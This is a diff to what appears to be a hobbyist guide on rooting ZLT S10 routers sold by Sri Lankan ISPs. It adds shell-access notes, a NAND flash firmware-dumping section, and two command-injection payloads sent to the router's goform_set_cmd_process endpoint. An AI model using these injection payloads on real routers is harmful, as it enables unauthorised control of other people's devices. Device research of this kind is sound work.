@@ -47,6 +47,7 @@ In Sri Lanka, ISPs like Mobitel and Hutch supply ZLT S10 routers that can easily
 <details>
 <summary>Band Info (LK)</summary>
 
+#### Band Info (LK)
 
 > [!NOTE]
 > This list includes only the frequency bands actively used by Sri Lankan ISPs for GSM, HSPA/HSPA+/UMTS, and LTE technologies.
@@ -95,6 +96,8 @@ In Sri Lanka, ISPs like Mobitel and Hutch supply ZLT S10 routers that can easily
 
 
 ## Getting Shell Access
+
+Gaining shell access is a crucial step. Once you have shell access, the router is no longer a "black box" and you are able to interact directly with its underlying system.
 
 > [!NOTE]
 > There are several ways to gain shell access to the device. Depending on your current firmware version, some methods may or may not work as expected.
@@ -153,14 +156,45 @@ For software, you can use terminal applications like PuTTY on Windows, screen on
 ### Exploiting RCE Vulnerabilities
 Certain Remote Code Execution (RCE) vulnerabilities stem from improper parsing, handling, or sanitization of arguments passed into the GoAhead backend. Although many of these flaws have been addressed and patched in recent firmware updates, some may still be present in older versions.
 
-> [!NOTE]
-> The effectiveness of the payloads listed below may vary depending on the firmware version in use.
+Exploit 1
+```shell
+url: http://[Gateway_IP]/goform/goform_set_cmd_process
+method: POST
+payload: {'isTest':'false', 'goformId':'USB_MODE_SWITCH', 'usb_mode':'6;<COMMAND>'}
+```
 
-
-
-
-## NAND Flash
+Exploit 2
+```shell
+url: http://[Gateway_IP]/goform/goform_set_cmd_process
+method: POST
+payload: {'isTest':'false', 'goformId':'URL_FILTER_ADD', 'addURLFilter':'http://just_another_text/&&<COMMAND>&&'}
+```
+---
 
 
 ## Dumping Firmware
+
+Sometimes, gaining shell access and dumping the full firmware is not straightforward or even possible. If you try UART, you may not be able to interrupt the bootloader. In such cases, dumping the firmware directly from the flash memory is an alternative, but it can be destructive. You may need to desolder the chip, which requires expensive equipment (like a hot air station) and experience. If done incorrectly, you risk damaging the chip, melting nearby components, or creating unwanted connections, ultimately rendering the device unusable.
+
+### NAND Flash
+
+<p float="left">
+	<img src="/assets/images/Actual_DS35M1GA-IB.jpg" width="200"/>
+	<img src="/assets/images/Size_DS35M1GA-IB.jpg" width="200"/>
+</p>
+
+As outlined in the hardware specifications of the device, this router is equipped with an 8-lead WSON NAND Flash chip (DS35M1GA-IB). Clipping WSON chips is extremely difficult. To access the chip, you must either solder wires directly to the chip while it on the PCB or remove the chip for easier connection, either by soldering it to a separate PCB or using a socket.
+
+I initially attempted the first method—soldering wires directly to the chip. While it may seem nearly impossible, using very thin copper wire can make this task feasible and it works perfectly with careful handling.
+
+![hooking](/assets/images/Hooking_DS35M1GA-IB.jpg)
+![pinout](/assets/images/Pinout_DS35M1GA-IB.png)
+
+> [!INFO]
+> For further info about the chip, [refer this document](/assets/documents/Dosilicon-DS35M1GA-IB_C725999.pdf).
+
+To read the chip, you will need a NAND Flash chip reader, such as the CH341. Additionally, since this chip operates at 1.8V, an adapter is required to match its voltage.
+
+
+
 
